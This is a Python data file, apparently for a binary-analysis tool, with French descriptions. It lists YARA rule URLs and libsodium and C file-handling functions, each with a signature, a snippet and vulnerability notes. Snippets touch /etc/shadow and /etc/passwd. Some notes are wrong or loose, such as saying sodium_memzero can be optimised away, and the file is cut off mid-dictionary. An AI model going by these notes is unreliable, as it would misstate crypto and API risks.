
yara_rules_list = {
    'anti_vm_detect': "https://raw.githubusercontent.com/AlienVault-Labs/AlienVaultLabs/refs/heads/master/malware_rulesets/yara/vmdetect.yar",
    'anti_debug_vm': "https://raw.githubusercontent.com/Yara-Rules/rules/refs/heads/master/antidebug_antivm/antidebug_antivm.yar",
    'anti_debug_with_linux': "https://raw.githubusercontent.com/DarkenCode/yara-rules/refs/heads/master/antidebug.yar",
    'findcrypt3_crypto' : "https://raw.githubusercontent.com/polymorf/findcrypt-yara/master/findcrypt3.rules",
    'packers' : "https://raw.githubusercontent.com/Yara-Rules/rules/refs/heads/master/packers/packer.yar"
}

all_libsodium_functions = {
    'nom_du_dictionnaire': 'Fonctions de cryptographie de libsodium',
    'sodium_init': 'Initialise la bibliothèque libsodium',
    'crypto_secretbox_easy': 'Cryptographie symétrique - Chiffrement facile',
    'crypto_secretbox_open_easy': 'Cryptographie symétrique - Déchiffrement facile',
    'crypto_secretbox_detached': 'Cryptographie symétrique - Chiffrement détaché',
    'crypto_secretbox_open_detached': 'Cryptographie symétrique - Déchiffrement détaché',
    'crypto_stream_salsa20': 'Cryptographie symétrique - Flux Salsa20',
    'crypto_stream_salsa20_xor': 'Cryptographie symétrique - XOR Salsa20',
    'crypto_stream_chacha20': 'Cryptographie symétrique - Flux ChaCha20',
    'crypto_stream_chacha20_xor': 'Cryptographie symétrique - XOR ChaCha20',
    'crypto_box_keypair': 'Cryptographie asymétrique - Génération de paire de clés',
    'crypto_box_easy': 'Cryptographie asymétrique - Chiffrement facile',
    'crypto_box_open_easy': 'Cryptographie asymétrique - Déchiffrement facile',
    'crypto_box_detached': 'Cryptographie asymétrique - Chiffrement détaché',
    'crypto_box_open_detached': 'Cryptographie asymétrique - Déchiffrement détaché',
    'crypto_box_seal': 'Cryptographie asymétrique - Scellage de boîte',
    'crypto_box_seal_open': 'Cryptographie asymétrique - Ouverture de boîte scellée',
    'crypto_sign_keypair': 'Signatures - Génération de paire de clés',
    'crypto_sign': 'Signatures - Signer un message',
    'crypto_sign_open': 'Signatures - Vérifier une signature',
    'crypto_sign_detached': 'Signatures - Signer un message (détaché)',
    'crypto_sign_verify_detached': 'Signatures - Vérifier une signature (détachée)',
    'crypto_hash_sha256': 'Hashing - SHA-256',
    'crypto_hash_sha512': 'Hashing - SHA-512',
    'crypto_generichash': 'Hashing - Hashing générique',
    'crypto_generichash_init': 'Hashing - Initialiser le hashing générique',
    'crypto_generichash_update': 'Hashing - Mettre à jour le hashing générique',
    'crypto_generichash_final': 'Hashing - Finaliser le hashing générique',
    'crypto_auth': 'HMAC - Authentification',
    'crypto_auth_verify': 'HMAC - Vérification de l\'authentification',
    'crypto_kdf_keygen': 'KDF - Génération de clé',
    'crypto_kdf_derive_from_key': 'KDF - Dérivation de clé',
    'crypto_kx_keypair': 'KX - Génération de paire de clés',
    'crypto_kx_client_session_keys': 'KX - Clés de session client',
    'crypto_kx_server_session_keys': 'KX - Clés de session serveur',
    'crypto_pwhash': 'Password Hashing - Hashing de mot de passe',
    'crypto_pwhash_str': 'Password Hashing - Hashing de mot de passe avec chaîne',
    'crypto_pwhash_str_verify': 'Password Hashing - Vérification de mot de passe avec chaîne',
    'crypto_pwhash_scryptsalsa208sha256': 'Password Hashing - Scrypt Salsa20/8 SHA-256',
    'crypto_pwhash_scryptsalsa208sha256_str': 'Password Hashing - Scrypt Salsa20/8 SHA-256 avec chaîne',
    'crypto_pwhash_scryptsalsa208sha256_str_verify': 'Password Hashing - Vérification Scrypt Salsa20/8 SHA-256 avec chaîne',
    'randombytes_buf': 'Random Number Generation - Génération de bytes aléatoires',
    'randombytes_uniform': 'Random Number Generation - Génération de nombre uniforme aléatoire',
    'randombytes_random': 'Random Number Generation - Génération de nombre aléatoire',
    'randombytes_stir': 'Random Number Generation - Mélanger le générateur de nombres aléatoires',
    'randombytes_close': 'Random Number Generation - Fermer le générateur de nombres aléatoires',
    'sodium_memzero': 'Utilitaires - Effacer la mémoire',
    'sodium_mlock': 'Utilitaires - Verrouiller la mémoire',
    'sodium_munlock': 'Utilitaires - Déverrouiller la mémoire',
    'sodium_bin2hex': 'Utilitaires - Convertir binaire en hexadécimal',
    'sodium_hex2bin': 'Utilitaires - Convertir hexadécimal en binaire',
    'sodium_base64_encoded_len': 'Utilitaires - Longueur encodée en base64',
    'sodium_bin2base64': 'Utilitaires - Convertir binaire en base64',
    'sodium_base642bin': 'Utilitaires - Convertir base64 en binaire'
}

all_libsodium_functions_infos = { #A FAIRE
    'nom_du_dictionnaire': 'Fonctions de cryptographie de libsodium',
    'sodium_init': 'int sodium_init(void) |----| ex: sodium_init() -> Initialise la bibliothèque |----| Vulns/Infos 1 : Aucune connue',
    'crypto_secretbox_easy': 'int crypto_secretbox_easy(unsigned char *ciphertext, const unsigned char *message, unsigned long long message_len, const unsigned char *nonce, const unsigned char *key) |----| ex: crypto_secretbox_easy(ciphertext, message, len, nonce, key) -> message chiffré |----| Vulns/Infos 1 : Rejouabilité si nonce réutilisé',
    'crypto_secretbox_open_easy': 'int crypto_secretbox_open_easy(unsigned char *message, const unsigned char *ciphertext, unsigned long long ciphertext_len, const unsigned char *nonce, const unsigned char *key) |----| ex: crypto_secretbox_open_easy(message, ciphertext, len, nonce, key) -> message déchiffré |----| Vulns/Infos 1 : Échec si le message est altéré',
    'crypto_secretbox_detached': 'int crypto_secretbox_detached(unsigned char *ciphertext, unsigned char *mac, const unsigned char *message, unsigned long long message_len, const unsigned char *nonce, const unsigned char *key) |----| ex: crypto_secretbox_detached(ciphertext, mac, message, len, nonce, key) -> chiffrement détaché |----| Vulns/Infos 1 : Rejouabilité si nonce réutilisé',
    'crypto_secretbox_open_detached': 'int crypto_secretbox_open_detached(unsigned char *message, const unsigned char *ciphertext, const unsigned char *mac, unsigned long long ciphertext_len, const unsigned char *nonce, const unsigned char *key) |----| ex: crypto_secretbox_open_detached(message, ciphertext, mac, len, nonce, key) -> déchiffrement détaché |----| Vulns/Infos 1 : Échec si MAC invalide',
    'crypto_box_keypair': 'int crypto_box_keypair(unsigned char *pk, unsigned char *sk) |----| ex: crypto_box_keypair(pub, priv) -> génère une paire de clés |----| Vulns/Infos 1 : Clés compromises si PRNG faible',
    'crypto_box_easy': 'int crypto_box_easy(unsigned char *ciphertext, const unsigned char *message, unsigned long long message_len, const unsigned char *nonce, const unsigned char *pk, const unsigned char *sk) |----| ex: crypto_box_easy(ciphertext, message, len, nonce, pk, sk) -> chiffrement asymétrique |----| Vulns/Infos 1 : Échec si clé privée compromise',
    'crypto_box_open_easy': 'int crypto_box_open_easy(unsigned char *message, const unsigned char *ciphertext, unsigned long long ciphertext_len, const unsigned char *nonce, const unsigned char *pk, const unsigned char *sk) |----| ex: crypto_box_open_easy(message, ciphertext, len, nonce, pk, sk) -> déchiffrement asymétrique |----| Vulns/Infos 1 : Non authentifié si mal utilisé',
    'crypto_sign_keypair': 'int crypto_sign_keypair(unsigned char *pk, unsigned char *sk) |----| ex: crypto_sign_keypair(pub, priv) -> génère une paire de clés pour signature |----| Vulns/Infos 1 : Clés prévisibles si PRNG faible',
    'crypto_sign': 'int crypto_sign(unsigned char *signed_message, unsigned long long *signed_message_len, const unsigned char *message, unsigned long long message_len, const unsigned char *sk) |----| ex: crypto_sign(signed_msg, &signed_len, msg, len, sk) -> message signé |----| Vulns/Infos 1 : Signature falsifiable si clé privée compromise',
    'crypto_sign_open': 'int crypto_sign_open(unsigned char *message, unsigned long long *message_len, const unsigned char *signed_message, unsigned long long signed_message_len, const unsigned char *pk) |----| ex: crypto_sign_open(msg, &msg_len, signed_msg, signed_len, pk) -> vérification de signature |----| Vulns/Infos 1 : Signature invalide si clé publique mal vérifiée',
    'crypto_hash_sha256': 'int crypto_hash_sha256(unsigned char *out, const unsigned char *in, unsigned long long inlen) |----| ex: crypto_hash_sha256(hash, msg, len) -> hash SHA-256 |----| Vulns/Infos 1 : Aucune connue, sauf attaques de collision avancées',
    'crypto_hash_sha512': 'int crypto_hash_sha512(unsigned char *out, const unsigned char *in, unsigned long long inlen) |----| ex: crypto_hash_sha512(hash, msg, len) -> hash SHA-512 |----| Vulns/Infos 1 : Aucune connue, sauf attaques de collision avancées',
    'crypto_pwhash': 'int crypto_pwhash(unsigned char *out, unsigned long long outlen, const char *passwd, unsigned long long passwdlen, const unsigned char *salt, unsigned long long opslimit, size_t memlimit, int alg) |----| ex: crypto_pwhash(hash, 64, "password", len, salt, 5, 256MB, ALG) -> hash sécurisé |----| Vulns/Infos 1 : Attaques par force brute si paramètres faibles',
    'crypto_pwhash_str': 'int crypto_pwhash_str(char *out, const char *passwd, unsigned long long passwdlen, unsigned long long opslimit, size_t memlimit) |----| ex: crypto_pwhash_str(hash, "password", len, 5, 256MB) -> hash sécurisé sous forme de chaîne |----| Vulns/Infos 1 : Vulnérable aux attaques si paramètres faibles',
    'randombytes_buf': 'void randombytes_buf(void *buf, size_t size) |----| ex: randombytes_buf(buffer, 32) -> génère 32 octets aléatoires |----| Vulns/Infos 1 : Faible si PRNG compromis',
    'randombytes_uniform': 'uint32_t randombytes_uniform(uint32_t upper_bound) |----| ex: randombytes_uniform(100) -> nombre entre 0 et 99 |----| Vulns/Infos 1 : Risque de biais si mal utilisé',
    'randombytes_random': 'uint32_t randombytes_random(void) |----| ex: uint32_t rnd = randombytes_random() -> nombre aléatoire |----| Vulns/Infos 1 : Faible si PRNG compromis',
    'sodium_memzero': 'void sodium_memzero(void *pnt, size_t len) |----| ex: sodium_memzero(buffer, len) -> efface la mémoire |----| Vulns/Infos 1 : Peut être optimisé par le compilateur, contournant l’effacement',
    'sodium_bin2hex': 'char *sodium_bin2hex(char *hex, size_t hex_maxlen, const unsigned char *bin, size_t bin_len) |----| ex: sodium_bin2hex(hex, max_len, bin, bin_len) -> conversion en hexadécimal |----| Vulns/Infos 1 : Risque de débordement si hex_maxlen mal défini',
    'sodium_hex2bin': 'int sodium_hex2bin(unsigned char *bin, size_t bin_maxlen, const char *hex, size_t hex_len, const char *ignore, size_t *bin_len, const char **hex_end) |----| ex: sodium_hex2bin(bin, max_len, hex, hex_len, NULL, &bin_len, NULL) -> conversion en binaire |----| Vulns/Infos 1 : Risque d’attaque par injection si la validation est faible'
}


all_c_file_manipulation = { # FAIT
    'nom_du_dictionnaire': 'Manipulation de fichier en C',
    'fopen': 'Ouvre un fichier',
    'fclose': 'Ferme un fichier',
    'fread': 'Lit des données depuis un fichier',
    'fwrite': 'Écrit des données dans un fichier',
    'fseek': 'Déplace le curseur de lecture/écriture dans un fichier',
    'ftell': 'Renvoie la position actuelle du curseur de lecture/écriture dans un fichier',
    'rewind': 'Réinitialise le curseur de lecture/écriture au début du fichier',
    'fflush': 'Vide le tampon de sortie d\'un fichier',
    'fgetc': 'Lit un caractère depuis un fichier',
    'fputc': 'Écrit un caractère dans un fichier',
    'fgets': 'Lit une chaîne de caractères depuis un fichier',
    'fputs': 'Écrit une chaîne de caractères dans un fichier',
    'fscanf': 'Lit des données formatées depuis un fichier',
    'fprintf': 'Écrit des données formatées dans un fichier',
    'remove': 'Supprime un fichier',
    'rename': 'Renomme un fichier',
    'tmpfile': 'Crée un fichier temporaire',
    'tmpnam': 'Génère un nom de fichier temporaire unique',
    'setvbuf': 'Définit le mode de tampon d\'un fichier',
    'feof': 'Teste la fin de fichier',
    'ferror': 'Teste les erreurs de fichier',
    'clearerr': 'Réinitialise les indicateurs d\'erreur de fichier',
    'open': 'Ouvre un fichier (GLIBC, bas niveau)',
    'close': 'Ferme un fichier (GLIBC, bas niveau)',
    'read': 'Lit des données depuis un fichier (GLIBC, bas niveau)',
    'write': 'Écrit des données dans un fichier (GLIBC, bas niveau)',
    'lseek': 'Déplace le curseur de lecture/écriture dans un fichier (GLIBC, bas niveau)',
    'fsync': 'Synchronise les modifications d\'un fichier avec le disque (GLIBC)',
    'fdatasync': 'Synchronise les données d\'un fichier avec le disque (GLIBC)',
    'mmap': 'Mappe un fichier ou un périphérique en mémoire (GLIBC)',
    'munmap': 'Démappe un fichier ou un périphérique de la mémoire (GLIBC)',
    'fileno': 'Renvoie le descripteur de fichier associé à un flux (GLIBC)',
    'fdopen': 'Ouvre un flux à partir d\'un descripteur de fichier (GLIBC)',
    'popen': 'Ouvre un flux vers/à partir d\'une commande shell (GLIBC)',
    'pclose': 'Ferme un flux ouvert par popen (GLIBC)',
    'fseeko': 'Déplace le curseur de lecture/écriture dans un fichier (GLIBC, support des grands fichiers)',
    'ftello': 'Renvoie la position actuelle du curseur de lecture/écriture dans un fichier (GLIBC, support des grands fichiers)',
    'fgetpos': 'Renvoie la position actuelle du curseur de lecture/écriture dans un fichier (GLIBC)',
    'fsetpos': 'Déplace le curseur de lecture/écriture dans un fichier (GLIBC)',
    'flockfile': 'Verrouille un flux pour un accès exclusif (GLIBC)',
    'funlockfile': 'Déverrouille un flux verrouillé par flockfile (GLIBC)',
    'getc_unlocked': 'Lit un caractère depuis un fichier sans verrouillage (GLIBC)',
    'putc_unlocked': 'Écrit un caractère dans un fichier sans verrouillage (GLIBC)',
    'fmemopen': 'Ouvre un flux en mémoire (GLIBC)',
    'open_memstream': 'Ouvre un flux en mémoire pour l\'écriture (GLIBC)',
    'fopencookie': 'Ouvre un flux personnalisé avec des fonctions de rappel (GLIBC)',
    'mkstemp': 'Crée un fichier temporaire avec un nom unique (GLIBC)',
    'mkdtemp': 'Crée un répertoire temporaire avec un nom unique (GLIBC)',
    'realpath': 'Renvoie le chemin canonique d\'un fichier (GLIBC)',
    'sync': 'Synchronise tous les tampons de fichiers avec le disque (GLIBC)',
    'stat': 'Renvoie des informations sur un fichier (GLIBC)',
    'fstat': 'Renvoie des informations sur un fichier à partir d\'un descripteur (GLIBC)',
    'lstat': 'Renvoie des informations sur un fichier (sans suivre les liens symboliques) (GLIBC)',
    'access': 'Vérifie les permissions d\'accès à un fichier (GLIBC)',
    'chmod': 'Modifie les permissions d\'un fichier (GLIBC)',
    'fchmod': 'Modifie les permissions d\'un fichier à partir d\'un descripteur (GLIBC)',
    'chown': 'Modifie le propriétaire d\'un fichier (GLIBC)',
    'fchown': 'Modifie le propriétaire d\'un fichier à partir d\'un descripteur (GLIBC)',
    'lchown': 'Modifie le propriétaire d\'un fichier (sans suivre les liens symboliques) (GLIBC)',
    'truncate': 'Tronque un fichier à une taille spécifiée (GLIBC)',
    'ftruncate': 'Tronque un fichier à une taille spécifiée à partir d\'un descripteur (GLIBC)',
    'link': 'Crée un lien physique vers un fichier (GLIBC)',
    'symlink': 'Crée un lien symbolique vers un fichier (GLIBC)',
    'unlink': 'Supprime un fichier (GLIBC)',
    'readlink': 'Lit le contenu d\'un lien symbolique (GLIBC)',
    'mkdir': 'Crée un répertoire (GLIBC)',
    'rmdir': 'Supprime un répertoire (GLIBC)',
    'opendir': 'Ouvre un répertoire (GLIBC)',
    'readdir': 'Lit une entrée d\'un répertoire (GLIBC)',
    'closedir': 'Ferme un répertoire (GLIBC)',
    'scandir': 'Lit le contenu d\'un répertoire (GLIBC)',
    'alphasort': 'Trie les entrées d\'un répertoire par ordre alphabétique (GLIBC)',
    'getcwd': 'Renvoie le répertoire de travail actuel (GLIBC)',
    'chdir': 'Change le répertoire de travail actuel (GLIBC)',
    'fchdir': 'Change le répertoire de travail actuel à partir d\'un descripteur (GLIBC)',
    'dup': 'Duplique un descripteur de fichier (GLIBC)',
    'dup2': 'Duplique un descripteur de fichier vers un autre (GLIBC)',
    'pipe': 'Crée un tube (pipe) pour la communication inter-processus (GLIBC)',
    'fcntl': 'Contrôle les propriétés d\'un descripteur de fichier (GLIBC)',
    'ioctl': 'Contrôle les propriétés d\'un périphérique ou d\'un fichier (GLIBC)',
    'select': 'Surveille plusieurs descripteurs de fichiers pour des événements (GLIBC)',
    'poll': 'Surveille plusieurs descripteurs de fichiers pour des événements (GLIBC)',
    'epoll': 'Surveille plusieurs descripteurs de fichiers pour des événements (GLIBC, Linux spécifique)',
    'inotify': 'Surveille les modifications de fichiers (GLIBC, Linux spécifique)'
}

all_c_file_manipulation_infos = { # FAIT
    'nom_du_dictionnaire': 'Manipulation de fichier en C - Infos Sécurité',
    'fopen': '[b][color=blue]FILE *fopen(const char *filename, const char *mode)[/color][/b]\n[code]FILE *fp = fopen("test.txt", "r");[/code]\n[color=red]• Race condition (TOCTOU)\n• Path traversal si filename non validé\n• Use-After-Free si double fclose[/color]',
    'fclose': '[b][color=blue]int fclose(FILE *stream)[/color][/b]\n[code]fclose(fp);[/code]\n[color=red]• Double free corruption\n• UAF si réutilisation du FILE*[/color]',
    'fread': '[b][color=blue]size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)[/color][/b]\n[code]fread(buffer, 1, 1024, fp);[/code]\n[color=red]• Buffer overflow (size * nmemb > buffer)\n• Heap overflow via contrôlé nmemb[/color]',
    'fwrite': '[b][color=blue]size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)[/color][/b]\n[code]fwrite(data, sizeof(char), len, fp);[/code]\n[color=red]• Memory disclosure via ptr non initialisé\n• Corruption de métadonnées heap[/color]',
    'fseek': '[b][color=blue]int fseek(FILE *stream, long offset, int whence)[/color][/b]\n[code]fseek(fp, 0, SEEK_END);[/code]\n[color=red]• Dépassement de offset sur 32-bit\n• Fuzzing de whence invalide[/color]',
    'ftell': '[b][color=blue]long ftell(FILE *stream)[/color][/b]\n[code]long pos = ftell(fp);[/code]\n[color=red]• Integer overflow sur fichiers >2GB (32-bit)\n• Fuite d\'adresse mémoire[/color]',
    'rewind': '[b][color=blue]void rewind(FILE *stream)[/color][/b]\n[code]rewind(fp);[/code]\n[color=red]• Comportement indéfini si stream fermé[/color]',
    'fflush': '[b][color=blue]int fflush(FILE *stream)[/color][/b]\n[code]fflush(fp);[/code]\n[color=red]• Data leakage via tampon non vidé\n• Crash si stream invalide[/color]',
    'fgetc': '[b][color=blue]int fgetc(FILE *stream)[/color][/b]\n[code]int c = fgetc(fp);[/code]\n[color=red]• EOF non vérifié → corruption\n• Boucles infinies si mal géré[/color]',
    'fputc': '[b][color=blue]int fputc(int c, FILE *stream)[/color][/b]\n[code]fputc(\'A\', fp);[/code]\n[color=red]• Injection de bytes contrôlés (ex: format string)[/color]',
    'fgets': '[b][color=blue]char *fgets(char *s, int size, FILE *stream)[/color][/b]\n[code]fgets(buf, 64, fp);[/code]\n[color=red]• Off-by-one via size mal calculée\n• Heap overflow si buffer dynamique[/color]',
    'fputs': '[b][color=blue]int fputs(const char *s, FILE *stream)[/color][/b]\n[code]fputs("Hello", fp);[/code]\n[color=red]• Format string si s contrôlé\n• Crash via pointeur NULL[/color]',
    'fscanf': '[b][color=blue]int fscanf(FILE *stream, const char *format, ...)[/color][/b]\n[code]fscanf(fp, "%s", buffer);[/code]\n[color=red]• Format string attack\n• Buffer overflow via spécificateurs non sécurisés[/color]',
    'fprintf': '[b][color=blue]int fprintf(FILE *stream, const char *format, ...)[/color][/b]\n[code]fprintf(fp, "Data: %s", input);[/code]\n[color=red]• Format string write-what-where\n• Heap spraying via contrôlé format[/color]',
    'remove': '[b][color=blue]int remove(const char *filename)[/color][/b]\n[code]remove("/tmp/file");[/code]\n[color=red]• TOCTOU avec symlink racing\n• Suppression de fichiers sensibles[/color]',
    'rename': '[b][color=blue]int rename(const char *oldpath, const char *newpath)[/color][/b]\n[code]rename("old", "new");[/code]\n[color=red]• Race condition (TOCTOU)\n• Hardlink/symlink exploitation[/color]',
    'tmpfile': '[b][color=blue]FILE *tmpfile(void)[/color][/b]\n[code]FILE *tmp = tmpfile();[/code]\n[color=red]• Fichiers temporaires prédictibles\n• Permission issues sur /tmp[/color]',
    'tmpnam': '[b][color=blue]char *tmpnam(char *s)[/color][/b]\n[code]char name[L_tmpnam]; tmpnam(name);[/code]\n[color=red]• Génération de noms prédictibles\n• Symlink attack avant création[/color]',
    'setvbuf': '[b][color=blue]int setvbuf(FILE *stream, char *buf, int mode, size_t size)[/color][/b]\n[code]setvbuf(fp, NULL, _IONBF, 0);[/code]\n[color=red]• Heap overflow si buf contrôlé\n• Use-after-free si buf réalloué[/color]',
    'feof': '[b][color=blue]int feof(FILE *stream)[/color][/b]\n[code]while (!feof(fp)) { ... }[/code]\n[color=red]• Boucles infinies si mal utilisé\n• State confusion après erreur[/color]',
    'ferror': '[b][color=blue]int ferror(FILE *stream)[/color][/b]\n[code]if (ferror(fp)) { ... }[/code]\n[color=red]• Mauvaise gestion des flags d\'erreur[/color]',
    'clearerr': '[b][color=blue]void clearerr(FILE *stream)[/color][/b]\n[code]clearerr(fp);[/code]\n[color=red]• Masquage d\'erreurs critiques[/color]',
    'open': '[b][color=blue]int open(const char *pathname, int flags, mode_t mode)[/color][/b]\n[code]int fd = open("file", O_RDWR);[/code]\n[color=red]• TOCTOU avec symlink\n• Permission bypass via O_TRUNC\n• FD leaks[/color]',
    'close': '[b][color=blue]int close(int fd)[/color][/b]\n[code]close(fd);[/code]\n[color=red]• Double close → corruption mémoire\n• UAF si réutilisation de fd[/color]',
    'read': '[b][color=blue]ssize_t read(int fd, void *buf, size_t count)[/color][/b]\n[code]read(fd, buf, 1024);[/code]\n[color=red]• Buffer overflow classique\n• Memory disclosure via large count[/color]',
    'write': '[b][color=blue]ssize_t write(int fd, const void *buf, size_t count)[/color][/b]\n[code]write(fd, data, len);[/code]\n[color=red]• Memory disclosure via buf non initialisé\n• Écriture hors limites[/color]',
    'lseek': '[b][color=blue]off_t lseek(int fd, off_t offset, int whence)[/color][/b]\n[code]lseek(fd, 0, SEEK_SET);[/code]\n[color=red]• Dépassement 32-bit (si offset > 2GB)[/color]',
    'fsync': '[b][color=blue]int fsync(int fd)[/color][/b]\n[code]fsync(fd);[/code]\n[color=red]• Denial-of-Service via appels répétés[/color]',
    'fdatasync': '[b][color=blue]int fdatasync(int fd)[/color][/b]\n[code]fdatasync(fd);[/code]\n[color=red]• Mêmes risques que fsync[/color]',
    'mmap': '[b][color=blue]void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset)[/color][/b]\n[code]void *mem = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);[/code]\n[color=red]• Arbitrary memory mapping\n• GOT overwrite via prot=PROT_WRITE|PROT_EXEC[/color]',
    'munmap': '[b][color=blue]int munmap(void *addr, size_t length)[/color][/b]\n[code]munmap(mem, 0x1000);[/code]\n[color=red]• Use-After-Unmap via réutilisation de pointeur[/color]',
    'fileno': '[b][color=blue]int fileno(FILE *stream)[/color][/b]\n[code]int fd = fileno(fp);[/code]\n[color=red]• Conversion FILE* → FD pour exploitation bas niveau[/color]',
    'fdopen': '[b][color=blue]FILE *fdopen(int fd, const char *mode)[/color][/b]\n[code]FILE *fp = fdopen(fd, "r");[/code]\n[color=red]• Double gestion FD/FILE* → corruption[/color]',
    'popen': '[b][color=blue]FILE *popen(const char *command, const char *type)[/color][/b]\n[code]popen("id", "r");[/code]\n[color=red]• Command Injection (RCE)\n• Shellshock-like exploits[/color]',
    'pclose': '[b][color=blue]int pclose(FILE *stream)[/color][/b]\n[code]pclose(fp);[/code]\n[color=red]• Zombie processes si mal géré[/color]',
    'fseeko': '[b][color=blue]int fseeko(FILE *stream, off_t offset, int whence)[/color][/b]\n[code]fseeko(fp, 0, SEEK_END);[/code]\n[color=red]• Mêmes risques que fseek + 64-bit overflow[/color]',
    'ftello': '[b][color=blue]off_t ftello(FILE *stream)[/color][/b]\n[code]off_t pos = ftello(fp);[/code]\n[color=red]• Fuite de mémoire via cast non sécurisé[/color]',
    'fgetpos': '[b][color=blue]int fgetpos(FILE *stream, fpos_t *pos)[/color][/b]\n[code]fgetpos(fp, &pos);[/code]\n[color=red]• Corruption de pos via buffer overflow[/color]',
    'fsetpos': '[b][color=blue]int fsetpos(FILE *stream, const fpos_t *pos)[/color][/b]\n[code]fsetpos(fp, &pos);[/code]\n[color=red]• Déplacement arbitraire dans le fichier[/color]',
    'flockfile': '[b][color=blue]void flockfile(FILE *stream)[/color][/b]\n[code]flockfile(fp);[/code]\n[color=red]• Deadlocks en multithread[/color]',
    'funlockfile': '[b][color=blue]void funlockfile(FILE *stream)[/color][/b]\n[code]funlockfile(fp);[/code]\n[color=red]• Double unlock → comportement indéfini[/color]',
    'getc_unlocked': '[b][color=blue]int getc_unlocked(FILE *stream)[/color][/b]\n[code]int c = getc_unlocked(fp);[/code]\n[color=red]• Race conditions en multithread[/color]',
    'putc_unlocked': '[b][color=blue]int putc_unlocked(int c, FILE *stream)[/color][/b]\n[code]putc_unlocked(\'A\', fp);[/code]\n[color=red]• Mêmes risques que getc_unlocked[/color]',
    'fmemopen': '[b][color=blue]FILE *fmemopen(void *buf, size_t size, const char *mode)[/color][/b]\n[code]FILE *mem = fmemopen(buffer, 128, "r+");[/code]\n[color=red]• Exploitation de buffer contrôlé\n• Heap Feng Shui[/color]',
    'open_memstream': '[b][color=blue]FILE *open_memstream(char **ptr, size_t *sizeloc)[/color][/b]\n[code]open_memstream(&buffer, &size);[/code]\n[color=red]• Heap overflow via contrôle de ptr/sizeloc[/color]',
    'fopencookie': '[b][color=blue]FILE *fopencookie(void *cookie, const char *mode, cookie_io_functions_t io_funcs)[/color][/b]\n[code]FILE *fp = fopencookie(...);[/code]\n[color=red]• Hijacking de vtable via io_funcs[/color]',
    'mkstemp': '[b][color=blue]int mkstemp(char *template)[/color][/b]\n[code]mkstemp("/tmp/fileXXXXXX");[/code]\n[color=red]• Template prédictible → symlink attack[/color]',
    'mkdtemp': '[b][color=blue]char *mkdtemp(char *template)[/color][/b]\n[code]mkdtemp("/tmp/dirXXXXXX");[/code]\n[color=red]• Mêmes risques que mkstemp[/color]',
    'realpath': '[b][color=blue]char *realpath(const char *path, char *resolved_path)[/color][/b]\n[code]realpath("/tmp/../etc/passwd", buffer);[/code]\n[color=red]• Buffer overflow si resolved_path trop petit[/color]',
    'sync': '[b][color=blue]void sync(void)[/color][/b]\n[code]sync();[/code]\n[color=red]• Denial-of-Service sur systèmes critiques[/color]',
    'stat': '[b][color=blue]int stat(const char *pathname, struct stat *statbuf)[/color][/b]\n[code]stat("file", &st);[/code]\n[color=red]• TOCTOU race condition\n• Fuite d\'infos via statbuf[/color]',
    'fstat': '[b][color=blue]int fstat(int fd, struct stat *statbuf)[/color][/b]\n[code]fstat(fd, &st);[/code]\n[color=red]• Mêmes risques que stat + FD leaks[/color]',
    'lstat': '[b][color=blue]int lstat(const char *pathname, struct stat *statbuf)[/color][/b]\n[code]lstat("symlink", &st);[/code]\n[color=red]• Mêmes risques que stat[/color]',
    'access': '[b][color=blue]int access(const char *pathname, int mode)[/color][/b]\n[code]access("/etc/shadow", R_OK);[/code]\n[color=red]• TOCTOU classique\n• Fuite d\'existence de fichiers[/color]',
    'chmod': '[b][color=blue]int chmod(const char *pathname, mode_t mode)[/color][/b]\n[code]chmod("file", 0777);[/code]\n[color=red]• Privilege escalation via setuid/setgid[/color]',
    'fchmod': '[b][color=blue]int fchmod(int fd, mode_t mode)[/color][/b]\n[code]fchmod(fd, 0777);[/code]\n[color=red]• Mêmes risques que chmod + FD control[/color]',
    'chown': '[b][color=blue]int chown(const char *pathname, uid_t owner, gid_t group)[/color][/b]\n[code]chown("file", 0, 0);[/code]\n[color=red]• Prise de contrôle de fichiers système[/color]',
    'fchown': '[b][color=blue]int fchown(int fd, uid_t owner, gid_t group)[/color][/b]\n[code]fchown(fd, 0, 0);[/code]\n[color=red]• Mêmes risques que chown + contrôle de FD[/color]',
    'lchown': '[b][color=blue]int lchown(const char *pathname, uid_t owner, gid_t group)[/color][/b]\n[code]lchown("symlink", 0, 0);[/code]\n[color=red]• Prise de contrôle via symlink attack[/color]',
    'truncate': '[b][color=blue]int truncate(const char *path, off_t length)[/color][/b]\n[code]truncate("file", 0);[/code]\n[color=red]• TOCTOU race condition\n• Destruction de données sensibles[/color]',
    'ftruncate': '[b][color=blue]int ftruncate(int fd, off_t length)[/color][/b]\n[code]ftruncate(fd, 0);[/code]\n[color=red]• Mêmes risques que truncate + contrôle de FD[/color]',
    'link': '[b][color=blue]int link(const char *oldpath, const char *newpath)[/color][/b]\n[code]link("file", "hardlink");[/code]\n[color=red]• Hardlink attack pour élévation de privilèges\n• TOCTOU race condition[/color]',
    'symlink': '[b][color=blue]int symlink(const char *target, const char *linkpath)[/color][/b]\n[code]symlink("/etc/passwd", "symlink");[/code]\n[color=red]• Symlink attack pour accès non autorisé\n• TOCTOU race condition[/color]',
    'unlink': '[b][color=blue]int unlink(const char *pathname)[/color][/b]\n[code]unlink("file");[/code]\n[color=red]• Suppression de fichiers sensibles\n• TOCTOU race condition[/color]',
    'readlink': '[b][color=blue]ssize_t readlink(const char *pathname, char *buf, size_t bufsiz)[/color][/b]\n[code]readlink("symlink", buf, 1024);[/code]\n[color=red]• Buffer overflow si bufsiz trop petit\n• Fuite de chemins sensibles[/color]',
    'mkdir': '[b][color=blue]int mkdir(const char *pathname, mode_t mode)[/color][/b]\n[code]mkdir("dir", 0777);[/code]\n[color=red]• Création de répertoires avec permissions excessives\n• TOCTOU race condition[/color]',
    'rmdir': '[b][color=blue]int rmdir(const char *pathname)[/color][/b]\n[code]rmdir("dir");[/code]\n[color=red]• Suppression de répertoires sensibles\n• TOCTOU race condition[/color]',
    'opendir': '[b][color=blue]DIR *opendir(const char *name)[/color][/b]\n[code]DIR *dir = opendir("/tmp");[/code]\n[color=red]• Path traversal si name non validé\n• UAF sur DIR* après closedir()\n• Race condition avec symlink[/color]',
    'readdir': '[b][color=blue]struct dirent *readdir(DIR *dirp)[/color][/b]\n[code]struct dirent *entry = readdir(dir);[/code]\n[color=red]• Fuite de mémoire via réutilisation de entry\n• Boucles infinies si mal géré[/color]',
